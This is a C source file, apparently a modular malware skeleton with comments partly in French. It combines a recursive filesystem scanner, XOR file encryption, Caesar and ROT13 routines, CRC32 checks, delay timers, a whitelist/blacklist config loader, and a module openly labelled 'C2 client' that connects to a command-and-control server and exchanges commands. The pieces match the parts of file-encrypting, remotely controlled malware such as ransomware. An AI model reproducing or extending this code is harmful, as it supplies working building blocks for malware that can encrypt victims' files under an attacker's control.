#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <ctype.h>
#include <time.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "scanner.h"
#include "xor_crypto.h"
#include "caesar_crypto.h"
#include "rot13_crypto.h"
#include "checksum.h"
#include "timer.h"
#include "config.h"
#include "c2_client.h"

// ============================================================================
// MODULE 1 : SCANNER (scanner.h)
// ============================================================================
int scan_directory(const char *path, char files[][MAX_PATH], int max_files) {
    DIR *dir = opendir(path);
    if (!dir) return 0;
    struct dirent *entry;
    int count = 0;
    while ((entry = readdir(dir)) != NULL && count < max_files) {
        if (entry->d_type == DT_REG) {
            snprintf(files[count], MAX_PATH, "%s/%s", path, entry->d_name);
            count++;
        }
    }
    closedir(dir);
    return count;
}

int scan_recursive(const char *path, char files[][MAX_PATH], int max_files, int current_count) {
    DIR *dir = opendir(path);
    if (!dir) return current_count;
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL && current_count < max_files) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
        char full_path[MAX_PATH];
        snprintf(full_path, MAX_PATH, "%s/%s", path, entry->d_name);
        struct stat st;
        if (stat(full_path, &st) == 0) {
            if (S_ISDIR(st.st_mode)) {
                current_count = scan_recursive(full_path, files, max_files, current_count);
            } else if (S_ISREG(st.st_mode)) {
                strncpy(files[current_count], full_path, MAX_PATH);
                current_count++;
            }
        }
    }
    closedir(dir);
    return current_count;
}

// ============================================================================
// MODULE 2 : XOR (xor_crypto.h)
// ============================================================================
void xor_buffer(char *buffer, size_t size, const char *key, size_t key_len) {
    for (size_t i = 0; i < size; i++) {
        buffer[i] ^= key[i % key_len];
    }
}

int xor_encrypt_file(const char *input, const char *output, const char *key) {
    FILE *in = fopen(input, "rb"), *out = fopen(output, "wb");
    if (!in || !out) return -1;
    char buffer[BUFFER_SIZE];
    size_t n, klen = strlen(key);
    while ((n = fread(buffer, 1, BUFFER_SIZE, in)) > 0) {
        xor_buffer(buffer, n, key, klen);
        fwrite(buffer, 1, n, out);
    }
    fclose(in); fclose(out);
    return 0;
}

int xor_decrypt_file(const char *input, const char *output, const char *key) {
    return xor_encrypt_file(input, output, key);
}

// ============================================================================
// MODULE 3 & 4 : CÉSAR & ROT13 (caesar_crypto.h, rot13_crypto.h)
// ============================================================================
char caesar_char(char c, int shift) {
    if (!isalpha(c)) return c;
    char base = isupper(c) ? 'A' : 'a';
    return (c - base + shift) % 26 + base;
}

int caesar_encrypt_file(const char *input, const char *output, int shift) {
    FILE *in = fopen(input, "r"), *out = fopen(output, "w");
    if (!in || !out) return -1;
    int c;
    while ((c = fgetc(in)) != EOF) fputc(caesar_char(c, shift), out);
    fclose(in); fclose(out);
    return 0;
}

int caesar_decrypt_file(const char *input, const char *output, int shift) {
    return caesar_encrypt_file(input, output, 26 - (shift % 26));
}

int rot13_file(const char *input, const char *output) {
    return caesar_encrypt_file(input, output, 13);
}

// ============================================================================
// MODULE 5 : CHECKSUM (checksum.h)
// ============================================================================
uint32_t calculate_crc32(const char *filepath) {
    FILE *f = fopen(filepath, "rb");
    if (!f) return 0;
    uint32_t crc = 0xFFFFFFFF;
    unsigned char buf[BUFFER_SIZE];
    size_t n;
    while ((n = fread(buf, 1, BUFFER_SIZE, f)) > 0) {
        for (size_t i = 0; i < n; i++) {
            crc ^= buf[i];
            for (int j = 0; j < 8; j++) crc = (crc >> 1) ^ (0xEDB88320 & (-(crc & 1)));
        }
    }
    fclose(f);
    return ~crc;
}

int verify_integrity(const char *filepath, uint32_t expected_crc) {
    return calculate_crc32(filepath) == expected_crc;
}

// ============================================================================
// MODULE 6 : TIMER (timer.h)
// ============================================================================
long get_current_timestamp() { return (long)time(NULL); }
void wait_seconds(int seconds) { sleep(seconds); }
void wait_until(long target) { while (get_current_timestamp() < target) sleep(1); }

// ============================================================================
// MODULE 7 : CONFIG (config.h)
// ============================================================================
Config* load_config(const char *filepath) {
    FILE *f = fopen(filepath, "r");
    if (!f) return NULL;
    Config *cfg = calloc(1, sizeof(Config));
    char line[MAX_LINE];
    int mode = 0; // 1: Whitelist, 2: Blacklist
    while (fgets(line, sizeof(line), f)) {
        line[strcspn(line, "\r\n")] = 0;
        if (line[0] == '#' || line[0] == '\0') continue;
        if (strstr(line, "[WHITELIST]")) { mode = 1; continue; }
        if (strstr(line, "[BLACKLIST]")) { mode = 2; continue; }
        if (mode == 1 && cfg->whitelist_count < MAX_ITEMS) strncpy(cfg->whitelist[cfg->whitelist_count++], line, 63);
        if (mode == 2 && cfg->blacklist_count < MAX_ITEMS) strncpy(cfg->blacklist[cfg->blacklist_count++], line, 255);
    }
    fclose(f);
    return cfg;
}

void free_config(Config *cfg) { if (cfg) free(cfg); }

// ============================================================================
// MODULE 8 : C2 CLIENT (c2_client.h)
// ============================================================================
int c2_connect(const char *ip, int port) {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = { .sin_family = AF_INET, .sin_port = htons(port) };
    inet_pton(AF_INET, ip, &addr.sin_addr);
    return (connect(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) ? -1 : s;
}

C2Response c2_send_command(int sockfd, const C2Command *cmd) {
    C2Response res = {0};
    if (send(sockfd, cmd, sizeof(C2Command), 0) > 0) recv(sockfd, &res, sizeof(res), 0);
    return res;
}

void c2_disconnect(int sockfd) { close(sockfd); }